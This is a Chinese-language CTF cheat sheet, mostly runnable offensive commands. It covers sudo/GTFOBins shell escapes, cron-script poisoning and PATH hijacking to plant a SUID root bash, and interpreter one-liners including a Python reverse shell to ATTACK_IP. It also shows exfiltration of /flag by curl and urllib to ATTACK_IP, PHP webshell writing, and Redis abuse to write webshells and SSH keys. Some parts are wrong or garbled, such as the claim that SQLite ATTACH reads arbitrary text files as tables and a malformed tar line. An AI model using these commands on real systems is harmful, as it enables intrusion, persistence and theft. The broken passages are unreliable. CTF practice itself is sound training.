## [g-priv] 提权辅助速查——SUID、sudo、PATH 与 cron

### [sudo-gtfo] sudo -l 与 GTFO 速查 | medium | sudo;gtfo;提权 | sudo提权
> `sudo -l` 给出当前用户可免密执行的命令，其中能调 shell 或读文件的立即变成 root；GTFOBins 是查这事的标准目录。

#### 这个条目的作用
拿到低权限 shell 后，第一件事永远是 `sudo -l`：它列出你当前用户能"以谁的身份、要不要密码"执行哪些命令。本条目把你从"看到输出但看不懂"教到"3 分钟内试出 root"——先读格式，再逐条验证常见可提权命令，最后用 GTFOBins 兜底冷门命令。

#### 前置条件
- 已有一个 shell（网页 RCE、反弹 shell 都行），并且当前用户能执行 `sudo -l`
- 明确目标：90% 的题只需要 **读** `/flag`、`/root/flag*` 这类文件，不一定要弹 root shell，别做多余破坏
- 知道打开 https://gtfobins.github.io 查命令（本机断网就把下面的常用清单背熟）

#### 第 1 步：看懂 sudo -l 的输出格式
```bash
sudo -l
```
输出长这样，逐段拆开看：
```txt
User www-data may run the following commands on host:
    (root) NOPASSWD: /usr/bin/find
    (www-data) NOPASSWD: /bin/systemctl stop nginx
    (ALL : ALL) /usr/bin/vim
```
| 片段 | 含义 |
|------|------|
| `(root)` | 可以**以 root 身份**运行（括号里是谁就能 `sudo -u 谁`） |
| `NOPASSWD:` | **免密码**执行——提权重灾区 |
| `/usr/bin/find` | 只允许这一个命令（必须全路径匹配） |
| `(ALL : ALL)` | 以任意用户、任意组身份，但要密码 |

#### 第 2 步：快速筛选高价值行
```bash
sudo -l | grep -iE 'nopasswd|\(root\)'
sudo -l | grep -iE 'find|vim|python|perl|php|ruby|awk|less|more|env|tee|cp|tar|git|man|ftp|ssh'
```
出现 `(root) NOPASSWD:` + 以上任意命令，基本就是送分题。先把这些命令名字记下来，下面逐个试。

#### 第 3 步：能弹 shell 的命令一行流（GTFOBins Shell 栏）
```bash
sudo find / -exec /bin/sh \;                        # find 的 -exec 直接调 shell
sudo vim -c ':!/bin/sh'                             # vim / vi / ex
sudo python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh"'
sudo ruby -e 'exec "/bin/sh"'
sudo php -r 'system("/bin/sh");'
sudo awk 'BEGIN{system("/bin/sh")}'                 # awk / mawk / gawk
sudo -u root env /bin/sh                            # env 也可以
sudo less /etc/shadow                               # less 里输 !sh 再回车也是 shell
```
每行执行后先 `id` 确认 `euid=0`，能出 root 就直接去 `/root` 找 flag。

#### 第 4 步：只允许"读文件"类命令时（不用弹 shell）
```bash
sudo less /root/flag.txt        # less / more / man 都行，还能 / 搜索
sudo -u root cat /root/flag     # sudoers 允许 cat 就直接读
sudo head -c 100 /root/flag.txt
sudo -u root /bin/bash          # 若 (ALL) ALL 干脆直接 sudo bash
```
凡是"能看到文件内容"的命令（cat/less/more/head/tail/sed/awk/nl/od/xxd）在 sudo 下都能读 root 的文件——**读 flag 不需要 shell，能读就行**。

#### 第 5 步：参数被 sudoers 限制时（绕过姿势）
```txt
# 限制写法举例：(root) NOPASSWD: /usr/bin/find /var/www -name "*.log"
# 意思是只能在这个路径下找，`-exec` 照样可用：
sudo find /var/www -name "*.log" -exec /bin/sh \;
# vim 若被限制为只能编辑某文件，照样在 vim 里执行 :!/bin/sh 逃逸
```
GTFOBins 每个命令条目有 `Shell` / `File read` / `File write` 三栏，还有 `### Limitations` 写明参数限制时怎么绕。记不住全部，就记住"能执行任意参数的命令 → 用它的执行/读取功能跑命令"。

#### 第 6 步：断网兜底清单（背熟这 10 个）
```bash
# 需要 root shell 的：
for c in "find / -exec /bin/sh \\;" "vim -c ':!/bin/sh'" "python3 -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'" \
         "perl -e 'exec \"/bin/sh\"'" "php -r 'system(\"/bin/sh\");'" "awk 'BEGIN{system(\"/bin/sh\")}'" "env /bin/sh"; do
  echo "--- sudo $c"; sudo $c -c 'id' 2>/dev/null || true
done
# 需要读文件的直接试：sudo less /root/flag* 、sudo -u root cat /root/flag*
```

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|------|------|------|
| `sudo: no tty present and no askpass program specified` | 非交互 shell 里跑 sudo 没有终端 | 先 `python3 -c 'import pty;pty.spawn("/bin/bash")'` 升级成交互式，或 `sudo -S` 从 stdin 读密码 |
| `command not found` | 用了相对命令名 | 用绝对路径：`sudo /usr/bin/find ...` |
| `sudo: /usr/bin/find: command not found` | 命令实际在别的目录（/bin 与 /usr/bin 合并前的老系统） | `ls /bin /usr/bin \| grep find` 找实际路径再 sudo |
| 执行被拒 `not allowed to execute` | sudoers 限了参数 | 查 GTFOBins 对应条目的 Limitations 段，用通配符/换参数绕过 |
| `sudo -l` 要密码、又不知道密码 | 没配 NOPASSWD | 去 `.bash_history`、`env`、配置文件里翻密码；没有就切别的提权思路（SUID/cron） |
| 提权失败但命令明明允许 | 该命令本身不能直接出 shell（如 `tee`） | 改走"写文件"路线：`sudo tee -a /etc/cron.d/x` 写入计划任务（非破坏，比改 passwd 安全） |

#### 实战要点
- 优先级：**能读文件就直接读**（`sudo less /root/flag`），比弹 shell 快且零风险。
- `sudo -l` 输出里 `(ALL : ALL)` 但没 NOPASSWD 时，先在 history/env/配置文件里找密码，找到就 `sudo -u root bash`。
- 别用 `sudo tee /etc/passwd` 改密码文件——破坏系统、还可能被平台判违规，`tee` 优先写 cron 或 `/etc/sudoers.d/` 加一条自己的免密规则。
- 每个命令先跑 `sudo <cmd> --help` 确认版本支持你要用的参数，老版本 vim/less 的逃逸写法略有差异。
- 提权成功后 `id` 确认 euid=0，再 `cat /root/flag*` / `find / -name '*flag*'` 收尾。

### [path-cron-abuse] PATH 劫持与 cron 可写利用 | hard | path;cron;劫持;利用 | 脚本提权
> root 定时任务执行可写脚本或脚本内用相对命令名、且目录可写时，可以替换掉执行的程序实现提权。

#### 这个条目的作用
当 root 的定时任务（cron）或服务脚本存在两个毛病之一——**脚本本体可写**，或**脚本里用相对命令名 + 搜索路径里有可写目录**——你就能把"root 将要执行的程序"换成你自己的恶意副本，让 root 替你执行命令。本条目教你完整走完：枚举 → 判断 → 投毒 → 收 flag。

#### 前置条件
- 已有低权限 shell，且 root 有一条 cron 或 systemd timer 在周期执行某个脚本
- 至少一个满足"可写"的位置：脚本文件本身、脚本所在目录、脚本调用命令的搜索路径
- 耐心：cron 最短周期一般是 1 分钟，投毒后要等它跑一轮

#### 第 1 步：把 root 的定时任务全翻出来
```bash
cat /etc/crontab                       # 系统 crontab，常写 /etc/cron.d 与周期任务
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ 2>/dev/null
cat /etc/cron.d/* 2>/dev/null
ls -la /var/spool/cron/ /var/spool/cron/crontabs/ 2>/dev/null   # 各用户 crontab
cat /var/spool/cron/root 2>/dev/null    # 有权限时直接看 root 的
systemctl list-timers 2>/dev/null       # systemd 定时器（cron 的替代者）
```
找到类似 `*/1 * * * * root /opt/scripts/backup.sh` 的行，记下脚本路径。**看脚本比看任务更重要**——把 `cat /opt/scripts/backup.sh` 的内容读出来。

#### 第 2 步：判断是哪一种可利用场景
```bash
ls -la /opt/scripts/backup.sh          # 脚本属主/权限（重点看其他用户能否写）
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|run|tmp|var/tmp)/'   # 可写目录清单
```
对照判断：
```txt
场景 A（脚本投毒）：backup.sh 属主是你或权限 o+w  → 直接改脚本内容。
场景 B（PATH 劫持）：脚本用相对命令名（如 tar、ps、zip），且：
     - 脚本所在目录可写（cron 常 cd 进目录再跑），或
     - 脚本里 system("tar ...") 由 PATH 解析 且 PATH 前缀目录可写
→ 放一个同名恶意文件截胡。
```

#### 第 3 步：场景 A——直接往可写脚本里追加 payload
```bash
cat <<'EOF' >> /opt/scripts/backup.sh
cp /bin/bash /tmp/rb && chown root:root /tmp/rb && chmod 4755 /tmp/rb
EOF
chmod +x /opt/scripts/backup.sh        # 确认脚本本身仍可执行（追加不能破坏第一行 #!/bin/bash）
```
payload 用"把 bash 复制成 SUID rootbash"而不是直接反弹 shell，好处是：不依赖外连、cron 跑完一遍后你随时、反复用。

#### 第 4 步：场景 B——PATH 劫持（脚本调用了相对命令名）
先确认脚本调用的命令与解析路径：
```bash
grep -nE '\b(tar|ps|zip|unzip|cp|mv|rm|scp|rsync|docker|curl|wget)\b' /opt/scripts/backup.sh
head -20 /opt/scripts/backup.sh        # 看有没有 cd /xx 与 PATH= 行
echo $PATH                             # 你自己 PATH（仅供参考，root cron 的 PATH 是另配的）
```
如果脚本里写的是 `tar czf backup.tar.gz dir/`（相对名）且当前目录（或 cron 的 PATH 前缀）可写：
```bash
# 1. 在脚本所在目录（cron 常在那里执行）放恶意同名文件：
cat > /opt/scripts/tar <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rb && chown root:root /tmp/rb && chmod 4755 /tmp/rb
EOF
chmod +x /opt/scripts/tar
# 2. 若脚本用 system("ps") 之类且 /usr/local/bin 可写，同理放 /usr/local/bin/ps
# 3. 顺带确认自己 PATH 前面有没有可写目录：
cat /etc/crontab | grep PATH            # root cron 的 PATH 定义
```
原理一句话：**脚本里的 `tar` 会被按目录顺序找到第一个同名可执行文件**，你在前面放一个，root 执行时就跑你的。

#### 第 5 步：等 cron 执行，然后用 SUID bash 收 flag
```bash
# 等 1-2 分钟（或看 cron 周期），确认 SUID 文件出现：
ls -la /tmp/rb
# 出现后执行（-p 是关键：保留 euid=0，不加 -p 会被 bash 重置权限）：
/tmp/rb -p
id            # 应显示 euid=0(root)
cat /root/flag* /flag 2>/dev/null
/bin/rm -f /tmp/rb                     # 用完清理，别留 SUID 后门
```

#### 第 6 步：验证与排错（payload 没生效时）
```bash
# cron 有没有真的跑：看任务日志
journalctl -u cron -n 20 2>/dev/null || tail -20 /var/log/cron 2>/dev/null
# 手动以当前用户跑一遍脚本，排除语法错误：
bash -x /opt/scripts/backup.sh 2>&1 | head    # -x 打印每步执行
```

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|------|------|------|
| 等了很久 /tmp/rb 没出现 | cron 语法错误或被拒（权限/路径不存在） | `journalctl -u cron` 看报错；`crontab -l` 核对五段格式：分 时 日 月 周 |
| SUID 文件出现但 `/tmp/rb -p` 还是普通用户 | 复制时属主不是 root，或没加执行位 | payload 里加 `chown root:root` + `chmod 4755`；确认是 root 执行的（不是你的手） |
| PATH 劫持没生效 | 脚本用绝对路径调用、或恶意文件没执行位、或目录不可写 | 再 `cat` 脚本看真实调用方式；`chmod +x` 恶意文件 |
| 投毒后脚本直接报错/不跑 | 追加内容破坏了脚本（丢了 `#!/bin/bash` 或没换行） | 先 `head -1` 确认 shebang 还在；用 `>>` 且 payload 自带换行 |
| cron 是一分钟一次，等太久 | 周期长或 `@reboot` 类任务 | 找找有没有其他更快触发（`systemctl list-timers`、watchdog 脚本）；有些题可手动触发 |
| `bash -p` 提示不能设置 euid | 该发行版 bash 对 SUID 有限制 | 换 `cp /bin/bash` 为静态编译 bash，或改用 python/perl 写 SUID 辅助 |

#### 实战要点
- 判定三要素缺一不可：**root 会执行 + 目标可写 + 能被你的内容命中**，先确认再动手，别盲目投全盘。
- payload 首选"生成 SUID rootbash"而非弹 shell：不依赖外连、可重复用、易清理。
- `cat /etc/crontab` 里带 `PATH=...` 行时，把恶意文件放在该 PATH 里**最靠前的可写目录**（通常是 /usr/local/bin 或脚本所在目录）。
- 投毒脚本前先 `cp backup.sh backup.sh.bak`，翻车可还原；操作别留下明显痕迹。
- 用完 `rm /tmp/rb` 并还原被改的脚本（能还原就还原，别让平台检测到持久后门）。

## [g-env] 环境与部署——语言一键 RCE、打包解压与数据库客户端

### [lang-rce] PHP/Python/Node 一键命令 | medium | php;python;node;rce | 一键执行
> 拿到命令执行后直接用解释器干一件事：反弹 shell、写文件、读文件、编码解码，一个 -c/-r/-e 全搞定。

#### 这个条目的作用
容器或目标机器上几乎必有 PHP / Python / Node 之一，它们自带的"命令行直接跑代码"参数就是万能工具箱：读 flag、写 webshell、反弹 shell、交互式升级，一条命令全干完。本条目按语言逐个教，含引号嵌套这个最大坑。

#### 前置条件
- 已有命令执行能力（RCE 漏洞点、反弹 shell、序列化反序列化执行等），能敲命令或传参数
- 先确认目标有哪些解释器：`which php python3 python node perl ruby 2>/dev/null`
- 准备一个接收反弹 shell 的攻击机 IP 与端口（不需要时跳过）

#### 第 1 步：PHP——`-r` 直接执行，`-i` 看环境
```bash
php -r 'system("id");'                              # 执行系统命令
php -r 'system($_GET["c"]);'                        # 变量可控版（配合写 webshell）
php -r 'echo file_get_contents("/flag");'           # 读文件
php -r 'echo base64_encode(file_get_contents("/flag"));'   # 读出来 base64 编码防截断
php -i | grep -iE 'disable_functions|open_basedir'  # 看哪些函数被禁（决定能不能 system）
```
命中 `disable_functions` 里有 `system/exec/passthru` 时（常见于 CTF 加固环境），改用 `PHP_BINARY`、`proc_open`、`pcntl_exec` 等替代——本机可先用 `php -r 'var_dump(function_exists("proc_open"));'` 探函数。

#### 第 2 步：PHP——写 webshell 到 web 目录
```bash
# 目标 web 目录可写时，一条命令生成一句话（目录必须可写）：
printf '<?php system($_GET["c"]);?>' > /var/www/html/s.php
# 或从 RCE 用 -r 写：
php -r 'file_put_contents("/var/www/html/s.php", "<?php system(\$_GET[\"c\"]);?>");'
# 然后本地访问：curl "http://target/s.php?c=id"
```
`$_GET["c"]` 写法注意：在单引号 shell 字符串里把 `$` 转义成 `\$` 防止被 shell 展开。

#### 第 3 步：Python——`-c` 执行与读写
```bash
python3 -c 'import os; os.system("id")'
python3 -c 'print(open("/flag").read())'                    # 直接读文件
python3 -c 'open("/tmp/x.txt","w").write(open("/flag").read())'
python3 -c 'import base64;print(base64.b64encode(open("/flag","rb").read()).decode())'
python3 -c 'import urllib.request;print(urllib.request.urlopen("http://ATTACK_IP:8888/"+open("/flag").read()).read())'   # 外带
```
读文件输出被截断时，先 base64 再打印（普通文本里换行/不可见字符易被截）。

#### 第 4 步：Python——反弹 shell 与交互式升级
```bash
# 反弹（攻击机先 nc -lvnp 4444）：
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACK_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# 把已有反弹升级成交互式（能 Tab 补全、Ctrl+C）：
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 升级后再按 Ctrl+Z，stty raw -echo; fg 即可完全交互（高级玩法，不要求掌握）
```
`os.dup2` 三连把 socket 复制到标准输入/输出/错误，是兼容性最好的反连模板，不依赖 `nc -e`。

#### 第 5 步：Node——`-e` 执行
```bash
node -e 'require("child_process").execSync("id",{stdio:"inherit"})'
node -e 'require("child_process").execSync("cat /flag")'
node -e 'require("child_process").exec("curl http://ATTACK_IP:8888/$(cat /flag)")'   # 外带
# 老版本（无 execSync 的 Node 8 以下）：
node -e 'process.mainModule.require("child_process").execSync("id")'
```
Node 报错 `require is not defined` 时用 `process.mainModule.require` 兜底，或 `global.process.mainModule`。

#### 第 6 步：引号地狱的终极解——base64 中转
```bash
# 不想跟引号搏斗时，把整段代码 base64 后解码执行：
echo 'import os;os.system("sleep 5")' | base64
# aW1wb3J0IG9zO29zLnN5c3RlbSgic2xlZXAgNSIp...
python3 -c 'import base64;exec(base64.b64decode("aW1wb3J0IG9zO29zLnN5c3RlbSgic2xlZXAgNSIp"))'
# 反弹 shell 这种长命令最适合这么干
```

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|------|------|------|
| `sh: 1: Syntax error` | 外层 shell 先展开了 `$` 或引号配对错 | 外层用**单**引号包整条，内层代码用**双**引号；`\$_GET` 转义美元符 |
| php: `system()` has been disabled | disable_functions 禁了常见执行函数 | `php -i \| grep disable_functions` 看名单，换 proc_open/pcntl_exec，或走 `mail()`/LD_PRELOAD 路（进阶） |
| `python3: command not found` | 目标只有 python2 | 把代码改写成兼容版（print 加括号的旧语法），或 `python -c` |
| Node 报 `execSync is not a function` | Node 版本太老 | 用 `process.mainModule.require` + `exec` |
| 反弹 shell 连不上 | 攻击机没监听 / IP 端口错 / 出网被拦 | 先本地 `nc -lvnp 4444` 确认；反弹失败改走 **外带**（curl 带数据回传）或写文件 |
| 读文件输出乱码/被截断 | 二进制内容或回显限制 | 先 base64 再读；或写进 web 目录再 HTTP 下载 |

#### 实战要点
- 无脑三连：`which php python3 node` → 用 `system/os.system/execSync` 跑 `id` 验证 → 再跑目标动作。
- **读文件优先**：`cat /flag`、`python3 -c 'print(open("/flag").read())'`，比弹 shell 快且稳。
- 输出可能被 WAF/回显截断，长内容一律 base64 中转或外带（`curl http://对方IP/?d=$(base64 -w0 /flag)`）。
- 反弹 shell 模板把 `ATTACK_IP` 换成自己的公网/内网 IP，端口别用被占用的。
- Web 目录可写时，`printf '<?php system($_GET["c"]);?>' > 路径` 一分钟变 webshell，之后慢慢玩。

### [tar-zip] 打包解压与加密 | easy | tar;zip;压缩;加密 | 解压
> 拿到压缩包先看结构再解，tar/zip/gzip 的常见参数与加密压缩包的处理是高频操作。

#### 这个条目的作用
CTF 里压缩包出现频率极高：题目附件、容器里的备份、网站源码、甚至是"加密压缩包藏 flag"的送分题。本条目按"先识别格式 → tar 系 → zip 系 → 其他格式 → 加密爆破 → openssl"的顺序，把解压/打包/加密三条线一次讲清。

#### 前置条件
- 目标机器或本地有 `tar` / `zip` / `unzip` / `gzip` / `bzip2` / `xz` / `7z` 中至少几个（`which tar zip 7z` 查）
- 拿到一个未知扩展名的文件时，先别急了解压——先做第 1 步
- 爆破加密包需要词表（/usr/share/wordlists/rockyou.txt 或自己准备字典）

#### 第 1 步：永远先识别真实格式
```bash
file download.me                          # 输出真实格式（不信任扩展名！）
xxd download.me | head -5                 # 看文件头魔数
binwalk download.me                       # 看是否内嵌多个文件/压缩流
```
常见魔数速记：`PK`（zip）、`\x1f\x8b`（gzip）、`BZh`（bzip2）、`7z\xbc\xaf`（7z）、`Rar!`（rar）、`\xfd7zXZ`（xz）。
> [!warn] 题目常把 `flag.zip` 改名成 `flag.png` 或加无关扩展名，`file` 一眼识破；`file` 也可能显示 `ASCII text`——那可能是 base64 包了一层，`base64 -d` 再看。

#### 第 2 步：tar 系——打包、预览、解压
```bash
tar czf out.tar.gz dir/                   # 打包并压缩（c 创建 z gzip f 指定文件）
tar xzf out.tar.gz                        # 解压到当前目录
tar xzf out.tar.gz -C /tmp/               # 解压到 /tmp
tar tvf out.tar.gz                        # 只列内容不展开！先看结构有没有坑
tar tf out.tar.gz | head                  # 只列文件名（-t 同 tvf 但更简洁）
tar xf out.tar.gz flag.txt                # 只解出其中单个文件
```
习惯：**任何压缩包先 `-t/-l` 预览**，确认没有明显的路径逃逸（路径里带 `../`）或巨型垃圾文件再解。

#### 第 3 步：zip 系——打包、加密、带口令解压
```bash
zip -r out.zip dir/                       # 递归打包
zip -P secret123 out.zip flag.txt         # 加密压缩（-P 明文给口令）
zip out.zip flag.txt -P ''                # 空口令加密
unzip out.zip                             # 解压
unzip -P secret123 out.zip                # 带口令解压
unzip -l out.zip                          # 只列内容
unzip -o out.zip -d /tmp/x                # 强制覆盖并解到指定目录
```
> [!tip] `unzip -l` 列出的条目如果包含绝对路径或 `../`，这就是 Zip Slip 考点——解压会往包外写文件，别急着解，先看题目预期。

#### 第 4 步：其他格式与嵌套压缩
```bash
gzip -d file.gz ; gunzip file.gz          # gzip（解完去掉 .gz）
bzip2 -d file.bz2                          # bzip2
xz -d file.xz                              # xz
7z x archive.7z                            # 7z；加密的 7z 用 7z x -p口令
7z l archive.7z                            # 列出内容
rar x archive.rar                          # rar（-p口令）
unrar e archive.rar                        # 另一个 rar 工具
tar xf archive.tar                         # 纯打包（无压缩）也用 tar xf
tar xzf a.gz b.tar                         # tar 里套 tar，`.tar.gz` 的常见变种
unzip -l out.zip && unzip out.zip && file * # 解完一层再 file 下一个目标
```
嵌套压缩（zip 里是 tar，tar 里再是 gz）很常见，养成"解一层 → `file` 下一个 → 再解"的循环。

#### 第 5 步：加密 zip/rar 的口令爆破
```bash
# 方法一：john（先转 hash 再破）
zip2john out.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# 方法二：fcrackzip（更直接，支持字典与暴力）
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt out.zip
fcrackzip -u -b -l 1-4 out.zip            # -b 暴力 1-4 位
# rar 同理：rar2john archive.rar > h.txt && john h.txt --wordlist=...
john hash.txt --show                      # 破出来自动显示明文
```
> [!tip] 题目加密包通常口令很简单（数字、题目标题、常见弱口令），先试 `123456`、题名、题目 hint，再上字典。`-u` 让 fcrackzip 用"解压测试"验证口令，比纯 CRC 校验可靠。

#### 第 6 步：openssl 对称加密兜底
```bash
# 加密：openssl enc -aes-256-cbc -salt -in flag.txt -out flag.enc -k PASSWORD
# 解密：
openssl enc -d -aes-256-cbc -in flag.enc -out flag.txt -k PASSWORD
# 常用算法：-aes-128-cbc / -aes-256-cbc / -des3；带 base64 输出加 -a
xxd flag.enc | head          # 开头是 Salted__ 就是 openssl enc 的产物
```
`file flag.enc` 显示 `data`、开头 `Salted__` 时基本可断定是 openssl enc，直接按这个解。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|------|------|------|
| `gzip: stdin: not in gzip format` | 扩展名是假的，实际不是 gzip | 回到第 1 步 `file` 识别；可能是 zip/rar/纯文本 |
| `unzip: cannot find zipfile directory` | 文件不是 zip 或已损坏/被截断 | `xxd \| head` 看头；`binwalk` 找内嵌 zip 的偏移 |
| 解压报 `../` 路径或文件写到外面 | Zip Slip | 不要直接解；`unzip -l` 先看，必要时手工按安全路径重建 |
| 带口令解压提示 wrong password | 口令不对 | `zip2john`+john 爆破，或先试空口令/弱口令/题目 hint |
| `7z` / `unrar` 不存在 | 机器上没装 | `tar xf` 解不了这些格式，用 `apt install p7zip-full unrar` 或换本地解 |
| john 跑很久没出结果 | 真实口令不在词表里 | 换 rockyou 完整版，或按题目 hint 猜（题名、数字、常见词） |
| 解压后 flag 是二进制/压缩内容 | 还有一层 | `file <解出的文件>` 递归处理，别停在一层 |

#### 实战要点
- **先 `file` 再解，先 `-l`/`-t` 再动手**——两个习惯能避开 90% 的坑。
- 打包素材到目标（如把 webshell 打成 tar 再 base64 传输）常用：`tar czf - dir/ | base64`，对端 `base64 -d | tar xzf -`。
- 加密包爆破优先词表+`-u` 验证，别一上来暴力全字符。
- 解压到独立目录（`-C /tmp/xx`）防止同名文件互相覆盖。
- 用 tar 的 `--transform` 或 zip 解压到空目录，是面对潜在 Zip Slip 时的保底方案。

### [db-clients] 数据库客户端常用操作 | medium | mysql;sqlite3;redis;数据库 | 查库
> 内网/容器里最常见的三种库：MySQL、SQLite（单文件最爱藏 flag）、Redis（未授权常客），一条命令进库逐行翻。

#### 这个条目的作用
拿到 shell 或能访问内网端口后，数据库就是 flag 和凭据的大本营：MySQL 常存应用密码与 flag、SQLite 文件直接丢在题目目录、Redis 未授权就是裸奔。本条目让你对三种库都能"连接 → 看结构 → 翻数据 → 必要时读文件/写文件"。

#### 前置条件
- 有一台能访问目标库的主机（或 shell 就在目标上），知道端口（MySQL 3306、Redis 6379）与凭据（root 免密/弱口令常见）
- 目标有对应客户端：`which mysql sqlite3 redis-cli`；没有就找 `python3` 用库连（`python3 -c` 版在文末）
- 先确认目标开了什么：`ss -tlnp | grep -E '3306|6379|33060'`、`find / -name '*.db' -o -name '*.sqlite*' 2>/dev/null`

#### 第 1 步：MySQL——交互式与非交互连接
```bash
mysql -h 127.0.0.1 -u root -p            # 交互式：回车后输入密码（不显示）
mysql -u root                            # 本机常见配置：root 免密直接进
mysql -h target -u root -p'password'     # 密码直接跟在 -p 后（无空格）
# 非交互 -e：适合脚本一条条跑
mysql -u root -e 'SHOW DATABASES;'       # 列出所有库
mysql -u root mydb -e 'SHOW TABLES;'     # 指定库看表
mysql -u root mydb -e 'DESC users;'      # 看表结构（列名）
mysql -u root mydb -e 'SELECT * FROM users;'
mysql -u root -e 'SELECT user,host,authentication_string FROM mysql.user;'   # 看账号与哈希
```
> [!tip] 免密 root 在 CTF 容器里极常见（`MYSQL_ALLOW_EMPTY_PASSWORD`）。非交互 `-e` 配合 shell 循环就能批量翻所有库表。

#### 第 2 步：MySQL——翻遍所有库的通用组合拳
```bash
# 列出全部库和表（组合 SQL）：
mysql -u root -e 'SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema NOT IN ("mysql","information_schema","performance_schema","sys");'
# 找到可疑表后直接 select（库名.表名 全限定）：
mysql -u root -e 'SELECT * FROM ctf.flag;'
# 模糊找 flag 相关表：
mysql -u root -e 'SHOW DATABASES;' | grep -iE 'flag|ctf|secret'
```

#### 第 3 步：MySQL——LOAD_FILE 读服务器文件
```bash
# 需要 FILE 权限且 secure_file_priv 允许：
mysql -u root -e 'SELECT @@secure_file_priv, @@version, @@basedir;'
# secure_file_priv 为空（允许任意路径）或为具体目录时才能读：
mysql -u root -e 'SELECT LOAD_FILE("/etc/passwd");'
mysql -u root -e 'SELECT LOAD_FILE("/var/www/html/config.php");'   # 读源码拿更多凭据
# secure_file_priv 为 NULL 时读不了——别浪费时间，去翻应用源码里的 DB 配置
```
> [!warn] `LOAD_FILE` 常见失败：无 FILE 权限（报 1045）、`secure_file_priv` 为 NULL 或目录限定。先查 `@@secure_file_priv` 再决定，别盲目重复。

#### 第 4 步：SQLite——单文件库直接翻
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null   # 先找文件
sqlite3 flag.db '.tables'                 # 列出所有表
sqlite3 flag.db '.schema'                 # 建表语句（能看到列名与 flag 格式）
sqlite3 flag.db 'SELECT * FROM flag;'     # 查数据
sqlite3 flag.db '.dump'                   # 全量导出（含数据，最稳）
sqlite3 flag.db 'PRAGMA table_info(flag);' # 只看列名
sqlite3 flag.db '.headers on' '.mode column' 'SELECT * FROM flag;'   # 对齐输出好看
```
> [!tip] SQLite 是单文件数据库，经常直接被放在 web 目录（`/var/www/html/db/flag.db`）甚至可以直接 HTTP 下载。拿到文件先复制一份到本地分析，别在原文件上折腾。

#### 第 5 步：SQLite——用 ATTACH 读任意文件（读不了库结构时的杀招）
```bash
# attach 把任意文件当表挂进来读（利用 sqlite 对文本文件的容错）：
sqlite3 flag.db 'ATTACH "/etc/passwd" AS p; SELECT * FROM p.passwd;'
sqlite3 flag.db 'ATTACH "/var/www/html/config.php" AS c; SELECT * FROM c.config;'
sqlite3'' 'ATTACH "/flag" AS f; SELECT * FROM f.flag;'     # 无 .db 文件也能开个临时库读
```
这招对"SQLite 能执行但文件读不了"的场景很好用——attach 一个文本文件进来当表，内容直接可查。

#### 第 6 步：Redis——未授权探测与翻数据
```bash
redis-cli -h 127.0.0.1 -p 6379 ping       # 返回 PONG = 未授权可直连
redis-cli INFO | head -20                 # 版本/配置信息（INFO server）
redis-cli KEYS '*'                        # 列出所有 key（key 名常就是 flag 提示）
redis-cli GET flag                        # 读指定 key
redis-cli -n 0 DBSIZE                    # 看 0 号库有多少 key
redis-cli --raw KEYS '*'                  # 原始输出（避免 \x00 转义干扰中文）
# 常用类型：GET 字符串；HGETALL 哈希；LRANGE list 0 -1 列表
redis-cli HGETALL user1
redis-cli LRANGE log 0 -1
```

#### 第 7 步：Redis——未授权写 webshell / SSH 公钥（进阶）
```bash
# 写 webshell（前提：web 目录可写、绝对路径已知）
redis-cli -h target SET k "<?php system(\$_GET['c']);?>"
redis-cli -h target CONFIG SET dir /var/www/html
redis-cli -h target CONFIG SET dbfilename s.php
redis-cli -h target SAVE
# 写 SSH 公钥做持久化（root 家目录可写时）：
redis-cli -h target SET x "\n\n你的公钥内容\n\n"
redis-cli -h target CONFIG SET dir /root/.ssh
redis-cli -h target CONFIG SET dbfilename authorized_keys
redis-cli -h target SAVE
```
> [!warn] `CONFIG SET dir` 需要 Redis 运行用户对该目录有写权限，且不能是容器里只读挂载——失败时 `redis-cli CONFIG GET dir` 看当前值，别盲目重试。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|------|------|------|
| `mysql: command not found` | 目标没装客户端 | 用 `python3 -c 'import pymysql...'` 或写 PHP `mysqli` 脚本连；容器常只有服务端没客户端 |
| MySQL 认证失败 1045 | 密码错/用户 host 限制 | 试 root 空密码；翻 `.bash_history`、`config.php`、`docker-compose.yml` 里的凭据 |
| `LOAD_FILE` 返回 NULL | 无 FILE 权限或 secure_file_priv 限制 | 先 `SELECT @@secure_file_priv`；NULL 就换思路（翻源码/慢查询日志写 webshell 等） |
| `sqlite3: not found` | 没装客户端 | `python3 -c 'import sqlite3;print(sqlite3.connect("flag.db").execute("select * from flag").fetchall())'` |
| attach 读文件报错 not a database | 目标文件不是文本/格式不兼容 | 用 `readfile` 前先 `file` 看类型；文本文件才能 attach |
| redis-cli 连不上/超时 | 端口不对、有密码或有 ACL | `redis-cli -a 密码` 试；`INFO` 报 `NOAUTH` 就是有密码，去配置文件/源码里翻 |
| CONFIG SET dir 后写不进去 | 目录不可写/权限不足 | `CONFIG GET dir` 确认；换可写目录（/tmp 验证）、或改打主从复制 RCE（进阶） |

#### 实战要点
- **先找库再连库**：`ss -tlnp` 看端口、`find / -name '*.db*'` 找文件，别瞎试连接。
- MySQL/Redis 常配弱口令或免密，`root` 空密码、`root`/`123456` 直接试，失败再去翻配置。
- SQLite 文件能复制就复制到本地用 DB Browser 慢慢看，服务器上一条条 SQL 太慢。
- 数据库里除了 flag 还有别的凭据（管理员密码哈希），翻完之后去登 Web 后台往往有第二段 flag。
- 拿到的凭据一律先 `id` 确认身份、评估影响再动手，写 webshell / SSH key 这类破坏性操作想清楚再执行。